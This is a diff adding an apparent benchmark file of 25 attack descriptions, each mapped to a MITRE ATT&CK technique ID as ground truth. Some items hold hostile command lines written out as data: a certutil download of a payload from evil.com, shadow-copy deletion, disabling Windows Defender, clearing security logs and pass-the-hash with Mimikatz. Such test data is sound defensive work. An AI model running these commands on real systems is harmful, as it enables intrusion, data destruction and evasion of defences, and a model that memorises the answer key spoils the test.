@@ -1,0 +1,177 @@
+[
+  {
+    "id": "Q01",
+    "query": "powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand aW1wb3J0 invoking script",
+    "category": "Execution",
+    "description": "Adversary executing base64 encoded PowerShell commands to bypass script execution policies.",
+    "ground_truth": ["T1059.001"]
+  },
+  {
+    "id": "Q02",
+    "query": "Attacker dumped credentials from memory of lsass.exe process using procdump tool",
+    "category": "Credential Access",
+    "description": "Dumping Local Security Authority Subsystem Service memory to extract plain text credentials and hashes.",
+    "ground_truth": ["T1003.001"]
+  },
+  {
+    "id": "Q03",
+    "query": "Adversary injected malicious DLL into svchost.exe memory space via CreateRemoteThread",
+    "category": "Defense Evasion / Privilege Escalation",
+    "description": "Dynamic-link library injection into legitimate system processes to hide malicious code execution.",
+    "ground_truth": ["T1055.001"]
+  },
+  {
+    "id": "Q04",
+    "query": "Scheduled task created via schtasks /create /tn SecurityUpdater /tr updater.bat /sc onlogon",
+    "category": "Persistence",
+    "description": "Using Windows Task Scheduler to establish persistence at user logon.",
+    "ground_truth": ["T1053.005"]
+  },
+  {
+    "id": "Q05",
+    "query": "Registry persistence added at HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+    "category": "Persistence",
+    "description": "Adding autorun payload entry in Windows Registry Run key for logon persistence.",
+    "ground_truth": ["T1547.001"]
+  },
+  {
+    "id": "Q06",
+    "query": "RDP connection established from internal host to domain controller on port 3389",
+    "category": "Lateral Movement",
+    "description": "Adversaries connecting to remote systems using Remote Desktop Protocol.",
+    "ground_truth": ["T1021.001"]
+  },
+  {
+    "id": "Q07",
+    "query": "Malware communicating with C2 server over HTTPS using periodic HTTP beaconing POST requests",
+    "category": "Command and Control",
+    "description": "Adversary utilizing standard encrypted web protocols for command and control channel.",
+    "ground_truth": ["T1071.001"]
+  },
+  {
+    "id": "Q08",
+    "query": "vssadmin.exe delete shadows /all /quiet executed before ransomware encryption",
+    "category": "Impact",
+    "description": "Inhibiting system recovery by deleting volume shadow copies using vssadmin.",
+    "ground_truth": ["T1490"]
+  },
+  {
+    "id": "Q09",
+    "query": "Requesting Kerberos Service Principal Name ticket with RC4 encryption to crack offline hash",
+    "category": "Credential Access",
+    "description": "Kerberoasting attack abusing valid domain user accounts to request service tickets.",
+    "ground_truth": ["T1558.003"]
+  },
+  {
+    "id": "Q10",
+    "query": "Data exfiltration using rclone to upload sensitive archives to mega.nz cloud storage",
+    "category": "Exfiltration",
+    "description": "Stealing and transferring data to cloud storage providers over web protocols.",
+    "ground_truth": ["T1567.002"]
+  },
+  {
+    "id": "Q11",
+    "query": "Spearphishing email delivered with malicious invoice.xlsm containing VBA macro payload",
+    "category": "Initial Access",
+    "description": "Phishing attack delivering malicious macro-enabled Office spreadsheet attachments.",
+    "ground_truth": ["T1566.001"]
+  },
+  {
+    "id": "Q12",
+    "query": "Execution of remote process via WMI wmic process call create cmd.exe /c whoami",
+    "category": "Execution",
+    "description": "Abusing Windows Management Instrumentation to execute interactive and remote commands.",
+    "ground_truth": ["T1047"]
+  },
+  {
+    "id": "Q13",
+    "query": "Adversary copied payload to C:\\Windows\\System32\\svchost.exe pretending to be legitimate system file",
+    "category": "Defense Evasion",
+    "description": "Masquerading malicious executable with legitimate system process name and path.",
+    "ground_truth": ["T1036.005"]
+  },
+  {
+    "id": "Q14",
+    "query": "Disabling Windows Defender antivirus real-time monitoring via Set-MpPreference -DisableRealtimeMonitoring $true",
+    "category": "Defense Evasion",
+    "description": "Impairing security tools by tampering with antivirus configurations.",
+    "ground_truth": ["T1562.001"]
+  },
+  {
+    "id": "Q15",
+    "query": "Enumeration of Active Directory domain users and group memberships using net user /domain and net group",
+    "category": "Discovery",
+    "description": "Querying Active Directory for domain user accounts and administrator groups.",
+    "ground_truth": ["T1087.002"]
+  },
+  {
+    "id": "Q16",
+    "query": "Lateral movement using Pass the Hash authentication via Mimikatz sekurlsa::pth with NTLM hash",
+    "category": "Lateral Movement",
+    "description": "Authenticating to remote services using NTLM hash without knowing plaintext password.",
+    "ground_truth": ["T1550.002"]
+  },
+  {
+    "id": "Q17",
+    "query": "DLL side-loading via vulnerable application loading malicious version.dll from local application directory",
+    "category": "Privilege Escalation / Defense Evasion",
+    "description": "Placing malicious DLL alongside legitimate binary to hijack execution flow upon startup.",
+    "ground_truth": ["T1574.002"]
+  },
+  {
+    "id": "Q18",
+    "query": "certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe ingress download",
+    "category": "Command and Control",
+    "description": "Using built-in certutil utility to download remote malicious payloads into the victim environment.",
+    "ground_truth": ["T1105"]
+  },
+  {
+    "id": "Q19",
+    "query": "Modifying file access control permissions with icacls /grant Everyone:F to access sensitive directory",
+    "category": "Defense Evasion",
+    "description": "Altering DACLs / file permissions using icacls to grant broad access to locked files.",
+    "ground_truth": ["T1222.001"]
+  },
+  {
+    "id": "Q20",
+    "query": "Network packet sniffing on interface using Wireshark or promiscuous mode to capture cleartext credentials",
+    "category": "Credential Access",
+    "description": "Capturing live network packets traversing host network interface to extract passwords and session tokens.",
+    "ground_truth": ["T1040"]
+  },
+  {
+    "id": "Q21",
+    "query": "Clearing Windows security event logs via wevtutil cl Security to cover tracks after intrusion",
+    "category": "Defense Evasion",
+    "description": "Using wevtutil utility to delete Windows security and system audit logs.",
+    "ground_truth": ["T1070.001"]
+  },
+  {
+    "id": "Q22",
+    "query": "Background Intelligent Transfer Service job created via bitsadmin /transfer to stage malware",
+    "category": "Persistence / Defense Evasion",
+    "description": "Abusing BITS jobs for file downloads and asynchronous background execution.",
+    "ground_truth": ["T1197"]
+  },
+  {
+    "id": "Q23",
+    "query": "Proxy execution of unauthorized code via msbuild.exe executing inline C# project file",
+    "category": "Defense Evasion",
+    "description": "Using Microsoft Build Engine (MSBuild) LOLBAS to bypass application allowlisting.",
+    "ground_truth": ["T1127.001"]
+  },
+  {
+    "id": "Q24",
+    "query": "Adversary archived stolen documents into password protected 7z archive using 7z.exe a -p",
+    "category": "Collection",
+    "description": "Compressing collected files into encrypted archive prior to exfiltration.",
+    "ground_truth": ["T1560.001"]
+  },
+  {
+    "id": "Q25",
+    "query": "Creation of malicious Windows service for persistent execution using sc create MalService binPath= payload.exe",
+    "category": "Persistence",
+    "description": "Registering and configuring a Windows service to establish persistence and privilege escalation.",
+    "ground_truth": ["T1543.003"]
+  }
+]
